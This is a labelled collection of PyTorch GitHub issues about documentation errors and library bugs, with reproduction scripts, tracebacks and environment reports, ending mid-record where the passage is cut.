[{"labels":[null,"documentation",null,null],"text":"Maybe some simpler type annotations can be introduced.\r\nCurrently it's `kernel_size: Union[T, Tuple[T, ...]], stride: Optional[Union[T, Tuple[T, ...]]]`, and it's hard to parse, especially since it's so comon and clutters the signatures. Can we introduce some type alias `int_or_inttuple` or something in this spirit?\r\n\r\n![image](https://user-images.githubusercontent.com/1041752/93633775-c8d31c80-f9ef-11ea-81ce-4e8d11b1aff3.png)\r\n\n\ncc @jlin27 @ezyang @malfet @rgommers @xuzhao9 @gramster"},{"labels":["documentation",null,null,null],"text":"## üêõ Bug\r\n\r\nPytorch documentation: https://pytorch.org/docs/stable/optim.html#torch.optim.SGD\r\n\"This is in contrast to Sutskever et. al. and other frameworks which employ an update of the form\"\r\n![image](https://user-images.githubusercontent.com/4337024/93537302-022c5f00-f900-11ea-9a98-fa83a7b90654.png)\r\n\r\nSGD: http://proceedings.mlr.press/v28/sutskever13.pdf\r\n![image](https://user-images.githubusercontent.com/4337024/93537287-f9d42400-f8ff-11ea-9535-42d1eafb92f1.png)\r\n\r\nAs an implication both the adapted and the interpreted version of SGD have negative momentum\r\n\r\n\n\ncc @jlin27 @vincentqb"},{"labels":[null,"documentation",null,null],"text":"## üêõ Bug\r\n\r\nFollowing an (adapted) version of the example provided in the docs for [`emit_nvtx`](https://pytorch.org/docs/stable/autograd.html#torch.autograd.profiler.emit_nvtx) produces the following error:\r\n\r\n```Python\r\nTraceback (most recent call last):\r\n  File \"test.py\", line 9, in <module>\r\n    with torch.autograd.profiler.emit_nvtx():\r\n  File \"/scratch/mattle/.conda/lib/python3.7/site-packages/torch/autograd/profiler.py\", line 553, in __enter__\r\n    False\r\nRuntimeError: Profiler is already enabled on this thread\r\n```\r\n\r\n\r\n\r\n## To Reproduce\r\n\r\n```Python\r\nimport torch\r\n\r\nprint(f'Version = {torch.__version__}')\r\n\r\nx = torch.rand(100, 100, device='cuda')\r\n\r\nwith torch.autograd.profiler.profile():\r\n    temp = x * x\r\n    with torch.autograd.profiler.emit_nvtx():\r\n        temp = x * x\r\n```\r\n\r\nYields the following output:\r\n\r\n```Python\r\nVersion = 1.6.0\r\nTraceback (most recent call last):\r\n  File \"test.py\", line 9, in <module>\r\n    with torch.autograd.profiler.emit_nvtx():\r\n  File \"/scratch/mattle/.conda/lib/python3.7/site-packages/torch/autograd/profiler.py\", line 553, in __enter__\r\n    False\r\nRuntimeError: Profiler is already enabled on this thread\r\n```\r\n\r\n## Expected behavior\r\n\r\nNo error\r\n\r\n## Environment\r\n\r\n```\r\nCollecting environment information...\r\nPyTorch version: 1.6.0\r\nIs debug build: False\r\nCUDA used to build PyTorch: 10.1\r\nROCM used to build PyTorch: N/A\r\n\r\nOS: Ubuntu 18.04.3 LTS (x86_64)\r\nGCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0\r\nClang version: Could not collect\r\nCMake version: version 3.10.2\r\n\r\nPython version: 3.7 (64-bit runtime)\r\nIs CUDA available: True\r\nCUDA runtime version: 10.1.243\r\nGPU models and configuration: \r\nGPU 0: Quadro GP100\r\nGPU 1: Quadro GP100\r\n\r\nNvidia driver version: 418.116.00\r\ncuDNN version: Could not collect\r\nHIP runtime version: N/A\r\nMIOpen runtime version: N/A\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.19.1\r\n[pip3] numpydoc==1.1.0\r\n[pip3] torch==1.6.0\r\n[conda] blas                      1.0                         mkl  \r\n[conda] cudatoolkit               10.1.243             h6bb024c_0  \r\n[conda] mkl                       2020.2                      256  \r\n[conda] mkl-service               2.3.0            py37he904b0f_0  \r\n[conda] mkl_fft                   1.1.0            py37h23d657b_0  \r\n[conda] mkl_random                1.1.1            py37h0573a6f_0  \r\n[conda] numpy                     1.19.1           py37hbc911f0_0  \r\n[conda] numpy-base                1.19.1           py37hfa32c7d_0  \r\n[conda] numpydoc                  1.1.0                     <pip>\r\n[conda] pytorch                   1.6.0           py3.7_cuda10.1.243_cudnn7.6.3_0    pytorch\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0): 1.6.0\r\n - OS (e.g., Linux): Linux\r\n - How you installed PyTorch (`conda`, `pip`, source): conda\r\n - Build command you used (if compiling from source):\r\n - Python version: 3.7.9\r\n - CUDA/cuDNN version:\r\n - GPU models and configuration:\r\n - Any other relevant information:\r\n\n\ncc @ezyang @albanD @zou3519 @gqchen @pearu @nikitaved @jlin27"},{"labels":["documentation",null,null],"text":"Update the [main doc page for sparse](https://pytorch.org/docs/master/sparse.html). What is needed includes at least:\r\n\r\n- remove the legacy constructors (`torch.sparse.FloatTensor` et al.), use `torch.sparse_coo_tensor` instead and explain it's a regular `Tensor` instance:\r\n\r\n```\r\n>>> s = torch.sparse_coo_tensor(indices=[[0, 3]], \r\n...                             values=[[1, 2], [3, 4]], \r\n...                             size=(4, 2))                               \r\n>>> s                                                                      \r\ntensor(indices=tensor([[0, 3]]),\r\n       values=tensor([[1, 2],\r\n                      [3, 4]]),\r\n       size=(4, 2), nnz=2, layout=torch.sparse_coo)\r\n>>> type(s)                                                                \r\n<class 'torch.Tensor'>\r\n```\r\n\r\n- do not use any private methods (e.g. `._indices()` --> `.indices()`).\r\n- add docstrings to sparse-specific methods (e.g. `coalesce()`, `is_coalesced()`.\r\n- explain the main purpose(s) of sparse tensors. for example, the word \"memory\" is not present on the page right now.\r\n- explain the purpose of the `torch.sparse` namespace (which is, hold functions where the \"unspecified elements are 0\" assumption doesn't hold or somehow sparse/dense don't have the same behaviour).\r\n- explain that functions in the `torch` namespace _may_ support sparse tensors, and give a few representative code examples (e.g. using `torch.bmm`)\r\n- explain the purpose of a hybrid tensor and give more details on it\n\ncc @jlin27 @vincentqb @aocsa @nikitaved @pearu"},{"labels":[null,"documentation",null,null],"text":"I am using this scheduler for my model and the \"verbose\" argument does not seem to exist within the source code of the documentation, even though the summarized documentation has it as an argument. Seems like a typo. \r\n\n\ncc @jlin27 @vincentqb"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nThe code for torch.optim.lr_scheduler.CosineAnnealingWarmRestarts does not take argument \"verbose\" but documentation says otherwise.\r\n\n\ncc @ezyang @zou3519 @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n[From the docs:](https://pytorch.org/docs/stable/generated/torch.norm.html)\r\n\r\n`torch.norm(input, p='fro', dim=None, keepdim=False, out=None, dtype=None)`\r\n\r\n> **dim** (int, 2-tuple of python:ints, 2-list of python:ints, optional) ‚Äì [...] If the input tensor has more than two dimensions, the vector norm will be applied to last dimension.\r\n\r\nThe docs say that by default the norm will be applied to the last dimension, when the input tensor has more than two axes. I see different behaviour:\r\n```\r\na = torch.rand(3, 4, 5)\r\ntorch.norm(a)\r\n# tensor(4.7850)\r\n```\n\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nFor some C++ functions (for example, torch::load), the [function documentation](https://pytorch.org/cppdocs/api/function_namespacetorch_1a4b369494adfb10b9a005aeb0bb6207cb.html?highlight=load) page shows a warning:  \r\n\r\n```\r\n\"doxygenfunction: Unable to resolve multiple matches for function ‚Äútorch::load‚Äù with arguments (std::vector<torch::Tensor>&, LoadFromArgs&&‚Ä¶) in doxygen xml output for project ‚ÄúPyTorch‚Äù from directory: /var/lib/jenkins/workspace/docs/cpp/build/xml.\"\r\n```\r\n\r\n![image](https://user-images.githubusercontent.com/39305301/92850084-9ab57180-f41e-11ea-8e73-47015c71c87e.png)\r\n\n\ncc @yf225 @glaringlee @jlin27"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nhttps://pytorch.org/docs/stable/quantization.html should have clear examples on how to customize `qconfig` objects for assigning custom qconfigs to layers or skipping layers from quantization.\n\ncc @jlin27 @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a @vkuzo"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nExample screenshot on my browser (Firefox 80.0.1, Ubuntu 18.04):\r\n![image](https://user-images.githubusercontent.com/26719449/92656714-86a82d80-f2c1-11ea-86f2-304946746ac7.png)\r\n\r\nSee link:\r\nhttps://pytorch.org/docs/stable/autograd.html#torch.autograd.functional.jacobian\r\n\r\nCurrent commit on `master`: 3674264\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen @jlin27"},{"labels":["documentation",null,null],"text":"## üêõ Bug\r\n\r\nI have a model trained with BN layers and tracking running parameters ON. After training, I found I couldn't turn the tracking_running_stats off for inference in PT1.6. Everything worked expectedly in PT1.5. \r\nThe results in PT1.6 with tracking_running_stats ON or OFF are the same after Batchnorm which means it always used tracked mean&variance. But PT1.5 can give different outputs for tracking_running_stats ON or OFF which is expected.\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```\r\nimport torch as th\r\nimport numpy as np \r\n\r\ndef turn_off_running_param(m):\r\n\r\n    if isinstance(m, (th.nn.BatchNorm2d, th.nn.InstanceNorm2d)):\r\n        m.track_running_stats=False\r\n\r\nclass sample_module(th.nn.Module):\r\n    def __init__(self, in_ch, out_ch):\r\n        super().__init__()\r\n\r\n        self.conv1_1 = th.nn.Conv2d(in_ch, out_ch, 7, padding=3)\r\n        self.bn = th.nn.BatchNorm2d(out_ch)\r\n        self.nonlinear = th.nn.LeakyReLU(negative_slope=0.2, inplace=True)\r\n\r\n        ### rand buffer \r\n        self.bn.running_mean = (th.ones((out_ch))*100.0)\r\n        self.bn.running_var = (th.ones(out_ch)*1.0)\r\n\r\n    def forward(self, x):\r\n        \r\n        x_conv = self.conv1_1(x)\r\n        x = self.bn(x_conv)\r\n\r\n        return x_conv, x\r\n\r\n\r\nif __name__ == \"__main__\":\r\n\r\n    model = sample_module(3, 4).eval().cuda()\r\n    image = th.rand((1, 3, 4, 4)).cuda()\r\n\r\n    ### BN track_running_stats ON\r\n    conv_out_tracking_on, bn_out_tracking_on = model(image)\r\n\r\n    ### BN track_running_stats OFF\r\n    model.apply(turn_off_running_param)\r\n    conv_out_tracking_off, bn_out_tracking_off = model(image)\r\n\r\n    print(\"Tracking off model:\\n\", model)\r\n    print(\"test pytorch:\", th.__version__)\r\n    if th.mean(th.abs(conv_out_tracking_on - conv_out_tracking_off)) != 0:\r\n        print(\"?????? Different conv output, unexpected!!!\")\r\n        print(\"conv_out_tracking_on:\", conv_out_tracking_on.cpu().data.numpy()[0,0,:,:].tolist())\r\n        print(\"conv_out_tracking_off:\", conv_out_tracking_off.cpu().data.numpy()[0,0,:,:].tolist())\r\n    else:\r\n        print(\"### Same conv output, expected!!!\")\r\n\r\n    if th.mean(th.abs(bn_out_tracking_on - bn_out_tracking_off)) != 0:\r\n        print(\"### Different BN outputs, expected!!!\")\r\n        print(\"bn_out_tracking_on:\", bn_out_tracking_on.cpu().data.numpy()[0,0,:,:].tolist())\r\n        print(\"bn_out_tracking_off:\", bn_out_tracking_off.cpu().data.numpy()[0,0,:,:].tolist())\r\n    else:\r\n        print(\"?????? Same BN output, unexpected!!!\")\r\n```\r\n\r\n\r\n/************************ TEST *********************************/\r\n\r\n/*********** PT1.6 results ************/\r\n(dgxenv) [yuecheng@pit101-dgx123 care_garage]$ python bn_test.py \r\n```\r\nTracking off model:\r\n sample_module(\r\n  (conv1_1): Conv2d(3, 4, kernel_size=(7, 7), stride=(1, 1), padding=(3, 3))\r\n  (bn): BatchNorm2d(4, eps=1e-05, momentum=0.1, affine=True, track_running_stats=False)\r\n  (nonlinear): LeakyReLU(negative_slope=0.2, inplace=True)\r\n)\r\ntest pytorch: 1.6.0\r\n### Same conv output, expected!!!\r\n?????? Same BN output, unexpected!!!\r\n```\r\n\r\n\r\n/*********** PT1.5 results ************/\r\n(pt1.5_for_yuecheng) [yuecheng@pit101-dgx123 care_garage]$ python bn_test.py \r\n```\r\nTracking off model:\r\n sample_module(\r\n  (conv1_1): Conv2d(3, 4, kernel_size=(7, 7), stride=(1, 1), padding=(3, 3))\r\n  (bn): BatchNorm2d(4, eps=1e-05, momentum=0.1, affine=True, track_running_stats=False)\r\n  (nonlinear): LeakyReLU(negative_slope=0.2, inplace=True)\r\n)\r\ntest pytorch: 1.5.1\r\n### Same conv output, expected!!!\r\n### Different BN outputs, expected!!!\r\nbn_out_tracking_on: [[-100.20112609863281, -100.19847869873047, -99.9124526977539, -99.82685089111328], [-100.03643798828125, -100.18742370605469, -100.01443481445312, -100.0298843383789], [-100.31416320800781, -100.27574920654297, -100.29280090332031, -99.8615493774414], [-100.10736083984375, -100.09064483642578, -100.03619384765625, -100.07273864746094]]\r\nbn_out_tracking_off: [[-0.7678689956665039, -0.7493481636047363, 1.24749755859375, 1.8450984954833984], [0.3819170296192169, -0.6721907258033752, 0.5355216860771179, 0.4277057647705078], [-1.557004690170288, -1.2887893915176392, -1.4078713655471802, 1.6028516292572021], [-0.11317643523216248, 0.0034803077578544617, 0.38364145159721375, 0.12853538990020752]]\r\n\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0): PT1.5, PT1.6\r\n - OS (e.g., Linux): Linux\r\n - How you installed PyTorch (`conda`, `pip`, source): conda\r\n - Build command you used (if compiling from source): conda install pytorch torchvision cudatoolkit=10.1 -c pytorch\r\n - Python version:3.7.8 \r\n - CUDA/cuDNN version: CUDA 10.1\r\n - GPU models and configuration: \r\n - Any other relevant information:\r\n\r\n\n\ncc @jlin27 @albanD @mruberry"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n'torch.per_channel_symmetric ‚Äî per tensor, symmetric'  supposed to be\r\n'torch.per_channel_symmetric ‚Äî per channel, symmetric' \r\nin docs/source/quantization-support.rst Line  320.\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\n\ncc @jlin27 @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a @vkuzo"},{"labels":["documentation",null,null],"text":"## üêõ Bug\r\n\r\n`mean` and `var` overflow on CPU and GPU for `float` and `half`. (only cuda half is good)\r\n\r\nAlso, torch.var is not supported on CPU for half type\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```python\r\nimport torch\r\nimport itertools\r\n\r\nprint(torch.__version__)\r\n\r\ndef test(dtype, device):\r\n    print(dtype, device)\r\n\r\n    if dtype == torch.float:\r\n        num = 3e38  # 3.4e38\r\n    elif dtype == torch.half:\r\n        num = 40000 # 65535\r\n\r\n    a = torch.tensor([num, num, num], dtype=dtype, device=device)\r\n    print('data', a)\r\n\r\n    b = a.mean()\r\n    print('mean', b)\r\n\r\n    if dtype == torch.half and device == 'cpu':\r\n        # RuntimeError: _th_var not supported on CPUType for Half\r\n        print()\r\n        return\r\n\r\n    c = a.var()\r\n    print('var', c)\r\n\r\n    print()\r\n\r\n\r\nfor dtype, device in itertools.product(\r\n    [torch.half, torch.float],\r\n    ['cpu', 'cuda']):\r\n\r\n    test(dtype, device)\r\n```\r\n\r\nOutput\r\n```\r\n1.7.0a0+06c277f\r\ntorch.float16 cpu\r\ndata tensor([40000., 40000., 40000.], dtype=torch.float16)\r\nmean tensor(inf, dtype=torch.float16)\r\n\r\ntorch.float16 cuda\r\ndata tensor([40000., 40000., 40000.], device='cuda:0', dtype=torch.float16)\r\nmean tensor(40000., device='cuda:0', dtype=torch.float16)\r\nvar tensor(0., device='cuda:0', dtype=torch.float16)\r\n\r\ntorch.float32 cpu\r\ndata tensor([3.0000e+38, 3.0000e+38, 3.0000e+38])\r\nmean tensor(inf)\r\nvar tensor(inf)\r\n\r\ntorch.float32 cuda\r\ndata tensor([3.0000e+38, 3.0000e+38, 3.0000e+38], device='cuda:0')\r\nmean tensor(inf, device='cuda:0')\r\nvar tensor(inf, device='cuda:0')\r\n```\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\nNo overflow\r\n\r\n## Environment\r\n\r\n```\r\n$ python -m torch.utils.collect_env\r\nCollecting environment information...\r\nPyTorch version: 1.7.0a0+06c277f\r\nIs debug build: False\r\nCUDA used to build PyTorch: 11.0\r\n\r\nOS: Fedora 31 (Workstation Edition) (x86_64)\r\nGCC version: (GCC) 8.3.1 20190223 (Red Hat 8.3.1-2)\r\nClang version: 7.0.1 (Fedora 7.0.1-6.fc29)\r\nCMake version: version 3.15.3\r\n\r\nPython version: 3.7 (64-bit runtime)\r\nIs CUDA available: True\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration: GPU 0: GeForce RTX 2070 SUPER\r\nNvidia driver version: 450.51.05\r\ncuDNN version: Probably one of the following:\r\n/usr/lib64/libcudnn.so.8.0.1\r\n/usr/lib64/libcudnn_adv_infer.so.8.0.1\r\n/usr/lib64/libcudnn_adv_train.so.8.0.1\r\n/usr/lib64/libcudnn_cnn_infer.so.8.0.1\r\n/usr/lib64/libcudnn_cnn_train.so.8.0.1\r\n/usr/lib64/libcudnn_ops_infer.so.8.0.1\r\n/usr/lib64/libcudnn_ops_train.so.8.0.1\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.17.3\r\n[pip3] torch==1.7.0a0+06c277f\r\n[pip3] torchvision==0.8.0a0+446eac6\r\n[conda] Could not collect\r\n```\r\n\r\n## Additional context\r\n\r\nIf someone is going to fix this by using a higher level dtype for accumulation (e.g. half -> float, float -> double), please make sure to also run benchmarks. \r\n\r\ncc @jlin27 @zasdfgbnm \r\n"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nhttps://github.com/pytorch/pytorch/blob/f8f35fddd4b2bd788953d6d6ccfadf690b73a3e8/torch/_torch_docs.py#L4273-L4286\r\n\r\nThe following warning can be removed given that https://github.com/pytorch/pytorch/pull/42004 is in.\r\n\r\ncc: @mruberry \n\ncc @jlin27 @mruberry @VitalyFedyunin"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nDear @apaszke,\r\n\r\nI would like to kindly remind you of an matplotlib NameError exception due to matplotlib.pyplot.imshow(). To reproduce this error, you may run [reinforcement_q_learning.ipynb in google colab](https://colab.research.google.com/github/pytorch/tutorials/blob/gh-pages/_downloads/2b3f06b04b5e96e4772746c20fcb4dcc/reinforcement_q_learning.ipynb).\r\n\r\nCheers\n\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\n\r\nEdgecase issue: when using IterableDataset whose total length is `BATCH_SIZE` and `num_workers > 0` is set in DataLoader, tensors with incorrect batch sizes are returned.\r\n\r\n## To Reproduce\r\n\r\n```python\r\nfrom torch.utils.data import DataLoader\r\nfrom torch.utils.data import IterableDataset, get_worker_info\r\nimport math\r\n\r\nclass MyIterableDataset(IterableDataset):\r\n    '''This dataset is copied from PyTorch docs.'''\r\n    def __init__(self, start, end):\r\n        super(MyIterableDataset).__init__()\r\n        assert end > start, \"this example code only works with end >= start\"\r\n        self.start = start\r\n        self.end = end\r\n    def __iter__(self):\r\n        worker_info = get_worker_info()\r\n        if worker_info is None:  # single-process data loading, return the full iterator\r\n            iter_start = self.start\r\n            iter_end = self.end\r\n        else:  # in a worker process\r\n            # split workload\r\n            per_worker = int(math.ceil((self.end - self.start) / float(worker_info.num_workers)))\r\n            worker_id = worker_info.id\r\n            iter_start = self.start + worker_id * per_worker\r\n            iter_end = min(iter_start + per_worker, self.end)\r\n        return iter(range(iter_start, iter_end))\r\n\r\ndef main():\r\n    ds = MyIterableDataset(0, 4)\r\n    dl = DataLoader(ds, batch_size=4, num_workers=2)\r\n    print(next(iter(dl)).shape) # should give 4, but gives 2\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n``` \r\nrun the above script to reproduce issue.\r\n\r\n## Expected behavior\r\n\r\n```\r\n    ds = MyIterableDataset(0, 4)\r\n    dl = DataLoader(ds, batch_size=4, num_workers=2)\r\n    print(next(iter(dl)).shape) # should give 4, but gives 2\r\n\r\n    ds = MyIterableDataset(0, 4)\r\n    dl = DataLoader(ds, batch_size=4, num_workers=4)\r\n    print(next(iter(dl)).shape) # should give 4, but gives 1\r\n\r\n    ds = MyIterableDataset(0, 8)\r\n    dl = DataLoader(ds, batch_size=4, num_workers=4)\r\n    print(next(iter(dl)).shape) # should give 4, works as expected.\r\n```\r\nClearly only happens when dataset length matches batch size. While this might be an edge case, small dataset sizes are frequently used in unit tests; so this matters.\r\n\r\n## Environment\r\n\r\n```\r\nCollecting environment information...\r\nPyTorch version: 1.6.0\r\nIs debug build: False\r\nCUDA used to build PyTorch: None\r\n\r\nOS: Microsoft Windows 10 Enterprise\r\nGCC version: Could not collect\r\nClang version: Could not collect\r\nCMake version: Could not collect\r\n\r\nPython version: 3.7 (64-bit runtime)\r\nIs CUDA available: False\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip3] blendtorch-btb==0.2.0\r\n[pip3] blendtorch-btt==0.2.0\r\n[pip3] numpy==1.19.1\r\n[pip3] torch==1.6.0\r\n[pip3] torchvision==0.7.0\r\n[conda] blas                      1.0                         mkl  \r\n[conda] blendtorch-btt            0.2.0                     dev_0    <develop>\r\n[conda] cpuonly                   1.0                           0    pytorch\r\n[conda] mkl                       2020.2                      256  \r\n[conda] mkl-service               2.3.0            py37hb782905_0  \r\n[conda] mkl_fft                   1.1.0            py37h45dec08_0  \r\n[conda] mkl_random                1.1.1            py37h47e9c7a_0  \r\n[conda] numpy                     1.19.1           py37h5510c5b_0  \r\n[conda] numpy-base                1.19.1           py37ha3acd2a_0  \r\n[conda] pytorch                   1.6.0               py3.7_cpu_0  [cpuonly]  pytorch\r\n[conda] torchvision               0.7.0                  py37_cpu  [cpuonly]  pytorch\r\n\r\nProcess finished with exit code 0\r\n```\r\n\r\n## Additional context\r\n Also happens on 1.5.0\r\n\n\ncc @ezyang @gchanan @zou3519 @SsnL @VitalyFedyunin @jlin27"},{"labels":[null,null,"documentation",null],"text":"## ‚ùì Questions and Help\r\n\r\nMy work host have all instruction sets, but service hosts are not support service host, such as 'AVX' and 'SSE4', so i want to disable the instruction set before build libtorch. How can I do it?\n\ncc @malfet @seemethere @walterddr @yf225 @glaringlee @jlin27"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nAt https://pytorch.org/docs/stable/optim.html, we see that the function `torch.optim.lr_scheduler.MultiStepLR` has a parameter called `verbose` that `If True, prints a message to stdout for each update. Default: False`.\r\n\r\nUsing `torch.__version__==1.6.0`, \r\nthis minimum example returns an error:\r\n\r\n```\r\nimport torch.nn as nn\r\nfrom torch.optim import Adam\r\nfrom torch.optim.lr_scheduler import MultiStepLR\r\n\r\nN, D_in, H, D_out = 64, 1000, 100, 10\r\n\r\nmodel = nn.Sequential(\r\n    nn.Linear(D_in, H),\r\n    nn.ReLU(),\r\n    nn.Linear(H, D_out),\r\n)\r\n\r\noptimizer = Adam(model.parameters(), lr=1e-04)\r\nscheduler = MultiStepLR(optimizer, milestones=[20,30], gamma=0.5, verbose=True)\r\n```\r\n\r\nError:\r\n```\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: __init__() got an unexpected keyword argument 'verbose'\r\n```\r\n\r\nFrom the [source code](https://pytorch.org/docs/stable/_modules/torch/optim/lr_scheduler.html#MultiStepLR) (linked in the documentation), this looks generalized to the other learning rate schedulers as well.\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## üêõ Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. follow the  mnist tutorial (https://pytorch-lightning.readthedocs.io/en/stable/new-project.html)\r\n1. use Trainer(tpu_cores=1)\r\n1. run\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n```\r\nTraceback (most recent call last):\r\n  File \"plmnist.py\", line 80, in <module>\r\n    trainer.fit(model, train_loader, val_loader)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/states.py\", line 48, in wrapped_fn\r\n    result = fn(self, *args, **kwargs)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/trainer.py\",line 1078, in fit\r\n    self.accelerator_backend.train(model)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/accelerators/tpu_backend.py\", line 87, in train\r\n    start_method=self.start_method\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/torch_xla/distributed/xla_multiprocessing.py\", line 284, in spawn\r\n    return _run_direct(fn, args, nprocs, join, daemon, start_method)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/torch_xla/distributed/xla_multiprocessing.py\", line 245, in _run_direct\r\n    fn(0, *args)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/accelerators/tpu_backend.py\", line 112, in tpu_train_in_process\r\n    results = trainer.run_pretrain_routine(model)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/trainer.py\",line 1239, in run_pretrain_routine\r\n    self.train()\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/training_loop.py\", line 394, in train\r\n    self.run_training_epoch()\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/training_loop.py\", line 491, in run_training_epoch\r\n    batch_output = self.run_training_batch(batch, batch_idx)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/training_loop.py\", line 844, in run_training_batch\r\n    self.hiddens\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/training_loop.py\", line 1049, in optimizer_closure\r\n    training_step_output_for_epoch_end = copy(training_step_output)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/copy.py\", line 88, in copy\r\n    return copier(x)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/core/step_result.py\", line 302, in __copy__\r\n    newone[k] = copy(v)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/copy.py\", line 96, in copy\r\n    rv = reductor(4)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/torch/tensor.py\", line 87, in __reduce_ex__\r\n    args = (self.cpu().numpy(),\r\nRuntimeError: Can't call numpy() on Tensor that requires grad. Use tensor.detach().numpy() instead.\r\n```\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\n## Environment\r\n\r\nEnvironment\r\nCUDA:\r\n- GPU:\r\n- available: False\r\n- version: None\r\nPackages:\r\n- numpy: 1.19.0\r\n- pyTorch_debug: False\r\n- pyTorch_version: 1.6.0.dev20200622\r\n- pytorch-lightning: 0.9.0\r\n- tensorboard: 2.2.0\r\n- tqdm: 4.48.2\r\nSystem:\r\n- OS: Linux\r\n- architecture:\r\n- 64bit\r\n-\r\n- processor:\r\n- python: 3.7.7\r\n- version: #1 SMP Debian 4.14.81.bm.15 Sun Sep 8 05:02:31 UTC 2019\r\n\r\nPyTorch Version (e.g., 1.0): 1.6\r\nOS (e.g., Linux): Linux\r\nHow you installed PyTorch (conda, pip, source): pip\r\nBuild command you used (if compiling from source):\r\nPython version: 3.7.8\r\nCUDA/cuDNN version: None\r\nGPU models and configuration: None\r\nAny other relevant information: torch_xla:1.6.0\r\n\r\n## Additional context\r\n\r\n```\r\n/pytorch_lightning/trainer/training_loop.py(1049)optimizer_closure()\r\n\r\n1044\r\n1045                # if the user decides to finally reduce things in epoch_end, save raw output without graphs\r\n1046                if isinstance(training_step_output_for_epoch_end, torch.Tensor):\r\n1047                    training_step_output_for_epoch_end = training_step_output_for_epoch_end.detach()\r\n1048                elif is_result_obj:\r\n1049B->              training_step_output_for_epoch_end = copy(training_step_output) ###<- there should be detach before copy\r\n1050                    training_step_output_for_epoch_end.detach()\r\n1051                else:\r\n1052                    training_step_output_for_epoch_end = recursive_detach(training_step_output_for_epoch_end)\r\n1053\r\n```\r\n\r\n<!-- Add any other context about the problem here. -->\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\nI was reading [this](https://github.com/pytorch/pytorch/wiki/Autograd-and-Fork) wiki page to solve multiprocess issue and I noticed that `Autograd engine relays on threads pool, `, which is the first sentence, probably has a spelling error. \r\n\r\nI think it's supposed to be 'relies' rather than 'relays' because the latter is something to do with sending signals or such and the former means it depends upon something like the threads pool. Plus, I think there could be a link to python documentation to point out that this type of context is actually problematic: https://docs.python.org/3/library/multiprocessing.html#contexts-and-start-methods\r\n\r\nAlso, I think it will be useful to have an explicit import of `multiprocessing` like this:\r\n```python\r\nimport multiprocessing as mp\r\n\r\n# The rest of code samples.\r\n```\r\n\r\nThanks\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\nHi\r\n\r\n`torch.finfo.tiny` has the description \r\n> \"The smallest positive representable number\". \r\n\r\nIt's ambiguous, and not the actual smallest positive number. For example, `torch.finfo(\"torch.float16\").tiny` get **6.10e-5**, but the smallest positive representable number in FP16 should be **2^-24** or **5.96e-8**. `numpy.finfo.tiny` also has this problem.\r\n\r\nI check the code in 